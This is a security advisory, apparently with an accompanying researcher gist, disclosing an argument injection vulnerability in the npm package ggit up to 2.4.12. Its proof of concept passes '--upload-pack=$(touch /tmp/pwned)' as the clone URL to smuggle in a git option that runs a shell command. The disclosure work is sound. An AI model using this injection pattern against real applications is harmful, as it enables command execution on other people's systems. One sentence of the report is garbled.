## How to fix?

There is no fixed version for `ggit`.

## Overview

Affected versions of this package are vulnerable to Arbitrary Argument Injection via the `clone()` API, which allows specifying the remote URL to clone and the file on disk to clone to. The library does not sanitize for user input or validate a given URL scheme, nor does it properly pass command-line flags to the `git` binary using the double-dash POSIX characters (`--`) to communicate the end of options.

## PoC

```
const clone = require("ggit").cloneRepo;
clone({
  url: "--upload-pack=$(touch /tmp/pwned)",
  folder: "/tmp/dbd",
}).then(function () {
  console.log("cloned repo to destination folder");
});

```

Argument Injection vulnerability in ggit@2.4.12

 [Raw](/lirantal/80c6d59ac1b682a32bc9d2ff92044bb9/raw/8eb66b4182996a4f4eca0b4be464edd69251aa8d/ggit-argument-injection.md)

# Argument Injection vulnerability in ggit@2.4.12

`ggit` describes itself as:

```
Local promise-returning git command wrappers

```

Resources:

* Project's GitHub source code: <https://github.com/bahmutov/ggit>
* Project's npm package: <https://www.npmjs.com/package/ggit>

## Background on exploitation

I'm reporting an Argument Injection vulnerability in `ggit` npm package.

This vulnerability manifests with the library's `clone()` API,
which allows specifying the remote URL to clone and the file on disk to clone to.
However, the library does not sanitize for user input or validate a given URL scheme,
nor does it properly pass command-line flags to the `git` binary using the double-dash
POSIX characters (`--`) to communicate the end of options.

Thus, allowing users to exploit an argument injection vulnerability in Git due to the
`--upload-pack` command-line option that results with executing arbirary commands.
(`outPath`) to clone it to then the vulnerability applies.

## Exploit

1. Install `ggit@2.4.12` or earlier
2. Establish the following POC:

```
const clone = require("ggit").cloneRepo;
clone({
  url: "--upload-pack=$(touch /tmp/pwned)",
  folder: "/tmp/dbd",
}).then(function () {
  console.log("cloned repo to destination folder");
});
```

3. Observe new file created on disk at `/tmp/pwned`
